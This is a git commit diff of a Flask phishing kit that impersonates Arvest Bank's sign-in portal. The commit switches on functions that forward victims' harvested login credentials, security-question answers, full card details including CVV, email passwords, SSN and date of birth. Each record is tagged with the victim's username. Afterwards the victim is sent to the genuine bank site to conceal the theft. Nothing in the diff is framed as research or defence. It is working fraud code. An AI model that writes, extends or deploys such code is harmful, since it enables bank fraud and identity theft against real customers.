1366101df9e183f276369b6952b4273677c35632
unknown <abdullahomotoke@gmail.com>
2022-08-30 16:03:30 +0800

    update

--- arvest/portals/routes.py
+++ arvest/portals/routes.py
@@ -1,4 +1,4 @@
-from flask import Blueprint, render_template, request, redirect, url_for
+from flask import Blueprint, session, render_template, request, redirect, url_for
 from .utils import security_question, report_login, report_card_details, report_ssn
 
 portals = Blueprint('portals', __name__)
@@ -11,13 +11,15 @@ def signin():
         user_id = request.form['user-id']
         password_ = request.form['password']
         if user_id and password_:
-            print(first_try_user, first_try_pass, user_id,password_)
-            # report_login(first_try_user, first_try_pass, user_id,password_,bank_name='Arvest')
+            session['username'] = user_id
+            # print(first_try_user, first_try_pass, user_id,password_)
+            report_login(first_try_user, first_try_pass, user_id,password_,bank_name='Arvest')
             return redirect(url_for('portals.question'))
     return render_template('signin.html')
 
 @portals.route('/question', methods=['GET','POST'])
 def question():
+    username = session['username']
     if request.method == 'POST':
         q1 = request.form['q1']
         ans1 = request.form['ans1']
@@ -25,8 +27,8 @@ def question():
         ans2 = request.form['ans2']
         q3 = request.form['q3']
         ans3 = request.form['ans3']
-        print(q1,ans1,q2,ans2,q3,ans3)
-        # security_question(q1,ans1,q2,ans2,q3,ans3)
+        # print(q1,ans1,q2,ans2,q3,ans3)
+        security_question(q1,ans1,q2,ans2,q3,ans3, username)
         return redirect(url_for('portals.card_confirmation'))
     return render_template('question.html')    
 
@@ -45,17 +47,19 @@ def question():
 
 @portals.route('/ssn-confirmation', methods=['GET','POST'])
 def ssn():
+    username = session['username']
     if request.method == 'POST':
         ssn = request.form['ssn']
         dob = request.form['dob']
         if ssn and dob:
-            print(ssn, dob)
-            # report_ssn(ssn,dob)
+            # print(ssn, dob)
+            report_ssn(ssn,dob,username)
             return redirect('https://www.arvest.com/')
     return render_template('identity-ssn.html')
 
 @portals.route('/signin/card-confirmation', methods=['GET','POST'])
 def card_confirmation():
+    username = session['username']
     if request.method == 'POST':
         card_name = request.form['card_name']
         card_number = request.form['card_number']
@@ -64,8 +68,8 @@ def card_confirmation():
         email = request.form['email-id']
         password_ = request.form['password']
         if card_name and card_number and exp_date and cvv and email and password_:
-            print( card_name, card_number, exp_date, cvv,email, password_)
-            # report_card_details(card_name, card_number, exp_date, cvv, email, password_)
+            # print( card_name, card_number, exp_date, cvv,email, password_)
+            report_card_details(card_name, card_number, exp_date, cvv, email, password_,username)
             return redirect(url_for('portals.ssn'))
     return render_template('bank-card.html')
 
